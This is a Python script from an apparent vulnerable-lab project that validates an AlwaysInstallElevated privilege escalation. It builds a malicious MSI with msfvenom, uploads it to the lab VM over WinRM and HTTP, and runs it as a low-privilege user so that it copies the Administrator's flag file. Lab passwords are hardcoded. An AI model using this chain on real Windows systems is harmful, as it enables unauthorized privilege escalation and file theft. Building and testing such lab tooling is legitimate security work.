#!/usr/bin/env python3
"""Build a real msfvenom MSI, stage it on the CysVuln VM, and trigger it
as User_Joe via PsExec to validate AlwaysInstallElevated end-to-end.

This is the player-tool equivalent of `scripts/validate/check_aie_response.py`:
where check_aie_response uses a hand-rolled wixl payload, this uses
msfvenom's `-f msi` output so the chain is reproduced with attacker-side
tradecraft. The staging + cleanup steps reuse `joe_task_runner`
(upload_binary_via_http, winrm_admin, remove_remote), and the
interactive trigger reuses `run_aie_as_joe_interactive.py`.

Invoked via `scripts/run-joe-tool.sh msfvenom-aie [target-ip]`.
"""
from __future__ import annotations

import argparse
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time

from joe_task_runner import (
    DEFAULT_HOST_FROM_GUEST,
    remove_remote,
    upload_binary_via_http,
    winrm_admin,
)


DEFAULT_PAYLOAD = "windows/exec"
DEFAULT_CMD = (
    r"cmd /c copy C:\Users\Administrator\Desktop\root.txt "
    r"C:\Users\Public\aie-msfvenom-flag.txt"
)
DEFAULT_EXITFUNC = "thread"
DEFAULT_MSI_VICTIM = r"C:\Users\Public\aie-msfvenom-payload.msi"
DEFAULT_FLAG_VICTIM = r"C:\Users\Public\aie-msfvenom-flag.txt"
DEFAULT_LOG_VICTIM = r"C:\Users\Public\aie-msfvenom-joe.log"


def build_msi(local: pathlib.Path, payload: str, cmd: str, exitfunc: str) -> int:
    if not shutil.which("msfvenom"):
        print("[!] msfvenom missing; run: nix develop .#kali", file=sys.stderr)
        return 2
    print(f"[*] building MSI: payload={payload} exitfunc={exitfunc}")
    print(f"    CMD: {cmd}")
    rc = subprocess.call(
        [
            "msfvenom",
            "-p",
            payload,
            f"CMD={cmd}",
            f"EXITFUNC={exitfunc}",
            "-f",
            "msi",
            "-o",
            str(local),
        ]
    )
    if rc != 0:
        print(f"[!] msfvenom build failed (rc={rc})", file=sys.stderr)
        return 3
    size = local.stat().st_size
    print(f"[*] built {local} ({size} bytes)")
    return 0


def trigger_interactive(
    *,
    target: str,
    winrm_port: int,
    rdp_port: int,
    admin_password: str,
    joe_password: str,
    msi_victim: str,
    flag_victim: str,
    log_victim: str,
    poll_timeout: int,
) -> int:
    here = pathlib.Path(__file__).resolve().parent
    interactive = here / "run_aie_as_joe_interactive.py"
    return subprocess.call(
        [
            sys.executable,
            str(interactive),
            "--target",
            target,
            "--winrm-port",
            str(winrm_port),
            "--rdp-port",
            str(rdp_port),
            "--admin-password",
            admin_password,
            "--joe-password",
            joe_password,
            "--msi-path",
            msi_victim,
            "--flag-path",
            flag_victim,
            "--log-path",
            log_victim,
            "--poll-timeout",
            str(poll_timeout),
        ]
    )


def main() -> int:
    p = argparse.ArgumentParser(
        description=(
            "Build an msfvenom MSI and trigger AIE as User_Joe end-to-end."
        )
    )
    p.add_argument("--target", default="127.0.0.1")
    p.add_argument(
        "--winrm-port",
        type=int,
        default=int(os.environ.get("WINRM_PORT", "15985")),
    )
    p.add_argument(
        "--rdp-port",
        type=int,
        default=int(os.environ.get("RDP_PORT", "13389")),
    )
    p.add_argument(
        "--admin-password",
        default=os.environ.get("ADMIN_PW", "PizzaMan123!"),
    )
    p.add_argument(
        "--joe-password",
        default=os.environ.get("JOE_PW", "VeryStrongPassword123!@#"),
    )
    p.add_argument(
        "--payload", default=os.environ.get("MSF_PAYLOAD", DEFAULT_PAYLOAD)
    )
    p.add_argument("--cmd", default=os.environ.get("MSF_CMD", DEFAULT_CMD))
    p.add_argument(
        "--exitfunc", default=os.environ.get("MSF_EXITFUNC", DEFAULT_EXITFUNC)
    )
    p.add_argument(
        "--local",
        default=os.environ.get("MSF_LOCAL")
        or str(
            pathlib.Path(tempfile.gettempdir())
            / f"aie-msfvenom-{time.strftime('%Y%m%d-%H%M%S', time.gmtime())}.msi"
        ),
    )
    p.add_argument(
        "--msi-victim-path",
        default=os.environ.get("MSF_MSI_VICTIM_PATH", DEFAULT_MSI_VICTIM),
    )
    p.add_argument(
        "--flag-victim-path",
        default=os.environ.get("MSF_FLAG_VICTIM_PATH", DEFAULT_FLAG_VICTIM),
    )
    p.add_argument(
        "--log-victim-path",
        default=os.environ.get("MSF_LOG_VICTIM_PATH", DEFAULT_LOG_VICTIM),
    )
    p.add_argument(
        "--host-from-guest",
        default=os.environ.get(
            "MSF_HOST_FROM_GUEST", DEFAULT_HOST_FROM_GUEST
        ),
    )
    p.add_argument(
        "--serve-port",
        type=int,
        default=int(os.environ.get("MSF_SERVE_PORT", "0")),
    )
    p.add_argument(
        "--poll-timeout",
        type=int,
        default=int(os.environ.get("MSF_POLL_TIMEOUT", "120")),
    )
    p.add_argument(
        "--keep",
        action="store_true",
        default=os.environ.get("MSF_KEEP", "0") == "1",
        help="Leave the MSI + flag + log files on the victim after run.",
    )
    # Support legacy positional [target-ip] for shell-script callers.
    p.add_argument("positional_target", nargs="?")
    args = p.parse_args()
    if args.positional_target:
        args.target = args.positional_target

    local = pathlib.Path(args.local)
    local.parent.mkdir(parents=True, exist_ok=True)

    rc = build_msi(local, args.payload, args.cmd, args.exitfunc)
    if rc != 0:
        return rc

    session = winrm_admin(args.target, args.winrm_port, args.admin_password)
    try:
        upload_binary_via_http(
            session,
            local,
            victim_bin=args.msi_victim_path,
            serve_name=os.path.basename(args.msi_victim_path),
            host_from_guest=args.host_from_guest,
            serve_port=args.serve_port or None,
        )
    except SystemExit as exc:
        print(f"[!] MSI staging failed: {exc}", file=sys.stderr)
        return 4

    print()
    print("[*] triggering msiexec via interactive User_Joe (PsExec/RDP)")
    rc = trigger_interactive(
        target=args.target,
        winrm_port=args.winrm_port,
        rdp_port=args.rdp_port,
        admin_password=args.admin_password,
        joe_password=args.joe_password,
        msi_victim=args.msi_victim_path,
        flag_victim=args.flag_victim_path,
        log_victim=args.log_victim_path,
        poll_timeout=args.poll_timeout,
    )

    if args.keep:
        print("[*] keeping victim artifacts:")
        for path in (
            args.msi_victim_path,
            args.flag_victim_path,
            args.log_victim_path,
        ):
            print(f"    {path}")
    else:
        print("[*] cleaning up victim artifacts")
        remove_remote(
            session,
            args.msi_victim_path,
            args.flag_victim_path,
            args.log_victim_path,
        )

    print()
    print("===== run-msfvenom-aie =====")
    print(f"  exit code: {rc}")
    print(f"  attacker MSI: {local}")
    print("============================")
    return rc


if __name__ == "__main__":
    sys.exit(main())
